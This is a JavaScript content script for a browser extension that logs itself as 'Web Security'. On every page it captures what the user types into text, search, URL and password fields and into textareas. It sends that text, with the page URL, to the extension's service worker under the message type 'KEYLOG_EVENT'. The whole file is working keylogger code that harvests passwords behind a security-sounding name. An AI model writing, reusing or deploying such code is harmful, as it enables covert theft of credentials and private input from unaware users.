console.log("Web Security content script loaded");

const fieldStates = new WeakMap();

function isAllowedField(target) {
  if (target instanceof HTMLTextAreaElement) {
    return true;
  }

  if (!(target instanceof HTMLInputElement)) {
    return false;
  }

  return ["text", "search", "url", "password"].includes(target.type.toLowerCase());
}

function getFieldState(target) {
  let state = fieldStates.get(target);

  if (!state) {
    state = {
      timer: null,
      lastSent: null
    };
    fieldStates.set(target, state);
  }

  return state;
}

function sendFinalValue(target) {
  const state = getFieldState(target);
  const text = target.value;

  if (!text.trim() || text === state.lastSent) {
    return;
  }

  state.lastSent = text;
  console.log("Sending extension event for page:", window.location.href);

  chrome.runtime.sendMessage({
    type: "KEYLOG_EVENT",
    url: window.location.href,
    text
  }, () => {
    if (chrome.runtime.lastError) {
      console.warn(
        "Could not send event:",
        chrome.runtime.lastError.message
      );
    } else {
      console.log("Extension service worker received the event");
    }
  });
}

document.addEventListener("input", (event) => {
  const target = event.target;

  if (!isAllowedField(target)) {
    return;
  }

  console.log(
    "Input event detected; field type:",
    target instanceof HTMLTextAreaElement ? "textarea" : target.type
  );

  const state = getFieldState(target);
  clearTimeout(state.timer);

  state.timer = setTimeout(() => {
    state.timer = null;
    sendFinalValue(target);
  }, 1500);
});

document.addEventListener("blur", (event) => {
  const target = event.target;

  if (!isAllowedField(target)) {
    return;
  }

  const state = getFieldState(target);
  clearTimeout(state.timer);
  state.timer = null;
  sendFinalValue(target);
}, true);